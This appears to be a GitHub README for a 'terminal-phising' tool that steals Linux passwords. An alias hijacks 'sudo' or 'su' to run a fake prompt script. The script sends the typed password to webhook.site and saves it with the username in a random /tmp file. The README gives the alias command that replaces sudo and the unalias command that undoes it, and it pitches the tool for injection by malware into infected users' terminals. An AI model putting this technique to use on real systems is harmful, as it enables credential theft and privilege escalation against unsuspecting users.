# terminal-phising 🕵️‍♀️ 🕵
Terminal passwod steal
can be injected with alias when su run in terminal it activate this script 

## use webhook.site for sending out the password as request value 
this script also saved the password at /tmp/ file named with random and the linux username at the start $whoami

this 2 script very simple and easy to write and use in bash it can be useful with a kind of malware that infected users using inject this file using alias via sudo su command for activate the fake script :)  

## to replace the script with sudo we can use alias 
```bash
alias sudo='./patch-to-scritp'
```
## for remove use the sudo replaced or any other command used for phising 
```bash
unalias sudo 
```
